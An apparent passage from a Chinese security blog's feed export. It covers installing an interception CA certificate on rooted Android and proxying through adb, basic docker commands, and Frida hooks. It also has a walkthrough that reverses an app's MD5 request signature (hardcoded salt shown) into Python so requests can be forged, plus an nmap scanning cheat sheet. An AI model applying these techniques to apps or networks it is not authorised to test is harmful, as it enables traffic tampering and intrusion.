class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -in xxx.pem </span><br></pre></td></tr></table></figure><p>4.证书改名（第三步输出的第一行为证书名），证书文件名后加一个 .0</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317154731043.png" alt="image-20220317154731043"></p><p>5.adb push 证书到手机 /sdcard/  </p><p>6.进入手机到/sdcard/，su到root用户，执行命令： 更改用户组： chgrp root 证书名 更改文件权限：chmod <strong>644</strong> 证书名   </p><p>7.mv 证书到 /system/etc/security/cacerts/   如果遇到 Read-only file system  执行命令： mount -o rw,remount /system 重新挂在/system目录为可读写 有些手机无法解决 Read-only file system </p><p>8.重启手机 旧版本fiddler生成的证书在手机上可能有问题，用最新版的fiddler 下载并安装证书生成插件 <a href="https://www.telerik.com/fiddler/add-ons">https://www.telerik.com/fiddler/add-ons</a> </p><p><strong>3,4种的对抗解决方案参考:</strong></p><p><a href="https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md">https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md</a></p><p><strong>adb代理</strong></p><p>设置代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy ip:port</span><br></pre></td></tr></table></figure><p>关闭代理（无需重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy :0</span><br></pre></td></tr></table></figure><p>移除代理（需要重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings delete global http_proxy</span><br><span class="line">adb shell settings delete global global_http_proxy_host</span><br><span class="line">adb shell settings delete global global_http_proxy_port</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编辑中…&lt;/p&gt;
&lt;h2 id=&quot;手机抓包&quot;&gt;&lt;a href=&quot;#手机抓包&quot; class=&quot;headerlink&quot; title=&quot;手机抓包&quot;&gt;&lt;/a&gt;手机抓包&lt;/h2&gt;&lt;p&gt;  优点: 无法对抗,全部能抓,没有抓不到的包.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手机上抓:Nethunt</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>docker 基础命令</title>
    <link href="https://bstark.me/posts/23136/"/>
    <id>https://bstark.me/posts/23136/</id>
    <published>2022-02-08T07:01:34.000Z</published>
    <updated>2022-04-01T06:29:58.107Z</updated>
    
    <content type="html"><![CDATA[<p>查看镜像</p><p>docker images</p><p>删除镜像</p><p>docker rmi 镜像id前三位</p><p>查看容器</p><p>docker ps -a</p><p>停止容器</p><p>docker stop 容器id前三位</p><p>删除容器</p><p>dockers rm 容器id 前三位</p><p>开启容器</p><p>dockers run -dit -p 物理机端口:容器端口 镜像id的前三位  #-dit 放到后台运行</p><p>进入容器</p><p>docker exec -it 容器id 前三位 /bin/bash</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;查看镜像&lt;/p&gt;
&lt;p&gt;docker images&lt;/p&gt;
&lt;p&gt;删除镜像&lt;/p&gt;
&lt;p&gt;docker rmi 镜像id前三位&lt;/p&gt;
&lt;p&gt;查看容器&lt;/p&gt;
&lt;p&gt;docker ps -a&lt;/p&gt;
&lt;p&gt;停止容器&lt;/p&gt;
&lt;p&gt;docker stop 容器id前三位&lt;/p</summary>
      
    
    
    
    
    <category term="docker" scheme="https://bstark.me/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Frida hook 打印字符串常用方法</title>
    <link href="https://bstark.me/posts/21357/"/>
    <id>https://bstark.me/posts/21357/</id>
    <published>2022-02-07T07:01:34.000Z</published>
    <updated>2022-04-01T06:31:33.511Z</updated>
    
    <content type="html"><![CDATA[<p>hook操作的时候经常遇到字符串无法打印,打印不出来,或打印出乱码等问题,这时候可以尝试下面方法去解决.</p><p>首先要确认要打印的类型是可打印的,本身如果是不可打印字符串，打印是乱码.</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>1.确认类型可以用class类的一个$className属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(p.$className)//如果打印P</span><br></pre></td></tr></table></figure><p>2.Java.cast 把p强转为对应类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hashMap = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>)  <span class="comment">//强转类型之前先new要转的类型</span></span><br><span class="line"><span class="keyword">var</span> newret = Java.cast(ret,HashMap)<span class="comment">//Java.cast强转</span></span><br><span class="line">printMap(newret)   <span class="comment">//用下面printmap函数打印hashmap 遍历</span></span><br></pre></td></tr></table></figure><p>或者new完直接用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd.a.overload(<span class="string">&#x27;java.util.Map&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> p = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>).$new(v)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;map:&#x27;</span>+p)</span><br></pre></td></tr></table></figure><p>3.调用该类对应的输出方法。通常有一个toString()方法</p><p><strong>hashmap 遍历</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printmap</span>(<span class="params">param</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> keys = param.keySet();</span><br><span class="line">    <span class="keyword">var</span> iterator = keys.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">        <span class="keyword">var</span> k = iterator.next();</span><br><span class="line">        <span class="built_in">console</span>.log(k+<span class="string">&quot;:&quot;</span>+param.get(k));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>byte数组打印</strong></p><p>getBytes数组无法直接打印,bytes array 是object String 和 bytes array可以相互转化String.getBytes() 字符串转bytes array,new String(bytes) bytes转成字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd =Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(<span class="string">&#x27;passwd=aaaaa&amp;salt=3333333&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(pwd.getBytes()) <span class="comment">//输出的是[object object],无法打印出字符串</span></span><br></pre></td></tr></table></figure><p>从新new一个java.lang.String,指定byte数组,构造一个新的string</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes = pwd.getBytes()</span><br><span class="line"><span class="keyword">var</span> newpwd = Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes) <span class="comment">//指定bytes类型</span></span><br><span class="line"><span class="built_in">console</span>.log(newpwd)<span class="comment">//打印</span></span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>使用js里的JSON类</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(p)) </span><br></pre></td></tr></table></figure><p>可能打印不出来字符串，一般能打印出p的字节数组。（数据和真实数据的对比）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;hook操作的时候经常遇到字符串无法打印,打印不出来,或打印出乱码等问题,这时候可以尝试下面方法去解决.&lt;/p&gt;
&lt;p&gt;首先要确认要打印的类型是可打印的,本身如果是不可打印字符串，打印是乱码.&lt;/p&gt;
&lt;h3 id=&quot;方法一&quot;&gt;&lt;a href=&quot;#方法一&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>frida定位和还原简单请求参数signature</title>
    <link href="https://bstark.me/posts/44205/"/>
    <id>https://bstark.me/posts/44205/</id>
    <published>2022-01-30T07:01:34.000Z</published>
    <updated>2022-04-01T06:36:38.776Z</updated>
    
    <content type="html"><![CDATA[<p>当对APP抓包时，请求参数存在signature签名，导致我们就不能对url进行修改,测试. 这时候我们需要对APP进行逆向分析，找出signature关键代码，进行分析算法，在利用python进行复刻，从而实现改写url实现发包测试.其中Frida更多是扮演了验证我们猜想的辅助工具.</p><p>开始今天的分析:</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317214616640.png" alt="image-20220317214616640"></p><p>这个APP存在请求参数signature:e6f47b91bb6fb89dc69079fdcb49d7dc</p><p>我们jadx进行反编译分析,根据请求参数,我们利用搜索关键字的方法匹配到signature,由于请求参数名是已知的,在java源码中也是”signature”字符串的形式.</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220317215144779.png" alt="image-20220317215144779"></p><p>定位到第二行<img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317215247105.png" alt="image-20220317215247105"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b(&quot;signature&quot;, a(udid, valueOf)).a();</span><br></pre></td></tr></table></figure><p>根据代码可知signature的值用a方法传入两个变量,生成了signature,向上跟踪变量udid和valueOf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String udid = MyApplication.getInstance().getUDID();</span><br><span class="line">String valueOf = String.valueOf(System.currentTimeMillis() / 1000);</span><br></pre></td></tr></table></figure><p>根据currentTimeMillis方法可知其中valueOf是一个到秒的时间戳</p><p>继续向上跟踪getUDID()的方法</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220317215928902.png" alt="image-20220317215928902"></p><p>根据代码可知,getUDID()是一个拼接手机IMEI+IMSI的两个字符串</p><p>到此两个a方法的两个udid,valueOf变量都分析完了,接着我们往下走,去分析 a()方法是怎么构造的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> com.hualong.framework.b.a.a(String.format(<span class="string">&quot;%s&amp;&amp;%s&amp;&amp;%s&quot;</span>, str, str2, <span class="string">&quot;f1190aca-d08e-4041-8666-29931cd89dde&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>a()方法是一个拼接字符串的操作,拼接成<code>str&amp;&amp;str2&amp;&amp;&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde</code></p><p>其中str是我们上面分析的udid,也就是IMEI+IMSI, str2是到秒的时间戳.继续往下跟方法a它怎么处理的这个字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hualong.framework.b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123;  <span class="comment">//传进去一个字符串</span></span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();<span class="comment">//new StringBuffer</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            instance.update(str.getBytes());</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest();<span class="comment">//输出MessageDigest,md5加密的值到digest数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b2 : digest) &#123;  <span class="comment">//遍历digest数组</span></span><br><span class="line">                stringBuffer.append(Integer.toString((b2 &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>, <span class="number">16</span>)).append(Integer.toString(b2 &amp; <span class="number">15</span>, <span class="number">16</span>));<span class="comment">////无符号右移后在进行且运算,Integer.toString(argv,16),表示把argv转成16进制表示的字符串.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();<span class="comment">//输出字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码我们用Frida hook来验证我们的猜想</p><p>先hook 这个类com.hualong.framework.b.a中的a方法,打印出他的 return stringBuffer.toString();.</p><p>hook代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> act = Java.use(<span class="string">&#x27;com.hualong.framework.b.a&#x27;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">    act.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> tt = <span class="built_in">this</span>.a(p)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;yc:&#x27;</span>+p)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;mc:&#x27;</span>+tt)</span><br><span class="line">    <span class="keyword">return</span> tt</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317224805678.png" alt="image-20220317224805678"></p><p>打印出了IMEI867686022237711-IMSI460NNNNNNNNNNNN&amp;&amp;1647521541&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde和加密后的字符串,可知我们的猜想是对的,接下来我们在进一步判断用js hook复刻这个a方法.我们把字符串传入看看和生成的是否一致</p><p>hook代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;   <span class="comment">//由于源代码传入的是一个字符串,我们需要use这个java.lang.String类,new一个对象出来</span></span><br><span class="line"><span class="keyword">var</span> str = Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(<span class="string">&#x27;IMEI867686022237711-IMSI460NNNNNNNNNNNN&amp;&amp;1647521541&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde&#x27;</span>)</span><br><span class="line"> <span class="built_in">console</span>.log(str)</span><br><span class="line"> <span class="keyword">var</span> stringbuffer = Java.use(<span class="string">&#x27;java.lang.StringBuffer&#x27;</span>).$new() <span class="comment">//new一个StringBuffer类,源代码也是new出来的类</span></span><br><span class="line"> <span class="keyword">var</span> instance = Java.use(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>).getInstance(<span class="string">&quot;MD5&quot;</span>);<span class="comment">//直接使用它引用的类,不需要new</span></span><br><span class="line"> <span class="keyword">var</span> integer = Java.use(<span class="string">&#x27;java.lang.Integer&#x27;</span>)</span><br><span class="line"> instance.update(str.getBytes());<span class="comment">//MessageDigest的update方法去指定byte 数组</span></span><br><span class="line"> <span class="keyword">var</span> digest = instance.digest()<span class="comment">//接收digest数组</span></span><br><span class="line"> <span class="keyword">var</span> len = digest.length   <span class="comment">//返回digest数组的长度</span></span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;len;i++)  <span class="comment">//循环遍历</span></span><br><span class="line"> &#123;</span><br><span class="line">    stringbuffer.append(integer.toString((digest[i] &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>, <span class="number">16</span>)).append(integer.toString(digest[i]  &amp; <span class="number">15</span>, <span class="number">16</span>));<span class="comment">////无符号右移后在进行且运算,Integer.toString(argv,16),表示把argv转成16进制表示的字符串.</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(stringbuffer.toString())<span class="comment">//输出stringbuffer字符串</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20220317232539087.png" alt="image-20220317232539087"></p><p>可见输出的bd078eb5ff0b276712d5887254639872 和源程序输出一样,证明我们的猜想是正确的.根据上面的分析</p><p>下一步我们开始把这个算法写成python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;IMEI867979020991839-IMSI460NNNNNNNNNNNN&amp;&amp;1629812392&amp;&amp;f1190aca-d08e-4041-8666-29931cd89dde&#x27;</span></span><br><span class="line">sig = <span class="string">&#x27;&#x27;</span></span><br><span class="line">instance = hashlib.md5()</span><br><span class="line">instance.update(<span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line">digest = instance.digest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> digest:</span><br><span class="line">    sig = sig + <span class="built_in">format</span>((i&gt;&gt;<span class="number">4</span>)&amp;<span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>) + <span class="built_in">format</span>(i&amp;<span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sig:&#x27;</span>+sig)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="built_in">bytearray</span>(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(m.digest())</span><br><span class="line"></span><br><span class="line">str_cons = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(m.digest()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;i:&#x27;</span>,i)</span><br><span class="line">    <span class="comment">#print((i&gt;&gt;4) &amp; 15)</span></span><br><span class="line">    str_cons = str_cons + <span class="built_in">format</span>(((i&gt;&gt;<span class="number">4</span>) &amp;<span class="number">15</span>), <span class="string">&#x27;x&#x27;</span>) + <span class="built_in">format</span>(i &amp; <span class="number">15</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str_cons)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当对APP抓包时，请求参数存在signature签名，导致我们就不能对url进行修改,测试. 这时候我们需要对APP进行逆向分析，找出signature关键代码，进行分析算法，在利用python进行复刻，从而实现改写url实现发包测试.其中Frida更多是扮演了验证我们猜想</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/0/"/>
    <id>https://bstark.me/posts/0/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-02-25T13:00:33.719Z</updated>
    
    <content type="html"><![CDATA[<p><strong>格式：</strong><br><strong>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</strong></p><p>Nmap进行完整全面的扫描</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –T4 <span class="operator">-</span>P80 –A –v</span><br></pre></td></tr></table></figure><p>其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态,-P指定端口。</p><h2 id="常用扫描"><a href="#常用扫描" class="headerlink" title="常用扫描"></a>常用扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="operator">-</span> <span class="operator">-</span><span class="keyword">open</span> <span class="operator">-</span>v <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> 不使用ping对ip进行服务识别 使用tcp发包 返回</span><br><span class="line">端口开放的结果</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="comment">--open -v banner.nse 192.168.1.1 获取服务器的banner信息</span></span><br><span class="line">nmap <span class="operator">-</span>sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> 判断哪些主机存活</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="number">192.168</span><span class="number">.0</span><span class="number">.3</span> 开放了哪些端口</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line">nmap <span class="operator">-</span>sU <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（UDP）</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="operator">-</span>O <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 操作系统识别</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>p <span class="number">80</span> <span class="operator">-</span>oG – <span class="number">192.168</span><span class="number">.1</span>.<span class="operator">*</span> <span class="operator">|</span> grep <span class="keyword">open</span> 列出开放了指定端口的主机列表</span><br><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>p <span class="number">80</span> baidu.com 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#主机发现#   选项用于选择不同的 ping 方法</span><br><span class="line">nmap <span class="operator">-</span>sP<span class="operator">/</span><span class="operator">-</span>sn ping扫描存活主机 不进行端口扫描.</span><br><span class="line">nmap <span class="operator">-</span>Pn    不检测主机存活跳过主机发现 直接扫描,也就是没有用到ping</span><br><span class="line">nmap <span class="operator">-</span>PS<span class="operator">/</span>PA<span class="operator">/</span>PU<span class="operator">/</span>PY[portlist] TCP SYN Ping<span class="operator">/</span>TCP ACK Ping<span class="operator">/</span>UDP Ping发现</span><br><span class="line">nmap <span class="operator">-</span>PE<span class="operator">/</span>PP<span class="operator">/</span>PM: 使用ICMP echo, <span class="type">timestamp</span>, <span class="keyword">and</span> netmask 请求包发现主机。</span><br><span class="line">nmap <span class="operator">-</span>PO[protocollist]: 使用IP协议包探测对方主机是否开启。</span><br><span class="line"></span><br><span class="line">nmap <span class="operator">-</span>PO[prococol list] 使用IP协议包探测对方主机是否开启</span><br><span class="line">nmap <span class="operator">-</span>n<span class="operator">/</span><span class="operator">-</span>R 不对IP进行域名反向解析<span class="operator">/</span>为所有的IP都进行域名的反响解析</span><br><span class="line">nmap <span class="comment">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。  </span></span><br><span class="line">nmap <span class="comment">--system-dns: 指定使用系统的DNS服务器  </span></span><br><span class="line">nmap <span class="comment">--traceroute: 追踪每个路由节点 </span></span><br></pre></td></tr></table></figure><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#扫描技术#   检测开放端口的方法(对于确定为在线的主机)</span><br><span class="line">nmap <span class="operator">-</span>sS    SYN扫描 只进行前两次握手  一般不会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sT    TCP三次握手扫描          会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sV    端口版本服务信息扫描</span><br><span class="line">nmap <span class="operator">-</span>O     系统版本信息扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span>sA<span class="operator">/</span>sW<span class="operator">/</span>sM TCP SYN<span class="operator">/</span>TCP <span class="keyword">connect</span>()<span class="operator">/</span>ACK<span class="operator">/</span>TCP窗口扫描<span class="operator">/</span>TCP Maimon扫描</span><br><span class="line"><span class="operator">-</span>sU UDP扫描</span><br><span class="line"><span class="operator">-</span>sN<span class="operator">/</span>sF<span class="operator">/</span>sX TCP <span class="keyword">Null</span>，FIN，<span class="keyword">and</span> Xmas扫描</span><br><span class="line"><span class="comment">--scanflags 自定义TCP包中的flags</span></span><br><span class="line"><span class="operator">-</span>sI zombie host[:probeport] Idlescan</span><br><span class="line"><span class="operator">-</span>sY<span class="operator">/</span>sZ SCTP INIT<span class="operator">/</span>COOKIE<span class="operator">-</span>ECHO 扫描</span><br><span class="line"><span class="operator">-</span>sO 使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line"><span class="operator">-</span>b “FTP relay host” 使用FTP bounce scan</span><br><span class="line"><span class="comment">--scanflags &lt;flags&gt;: 定制TCP包的flags。  </span></span><br></pre></td></tr></table></figure><h2 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 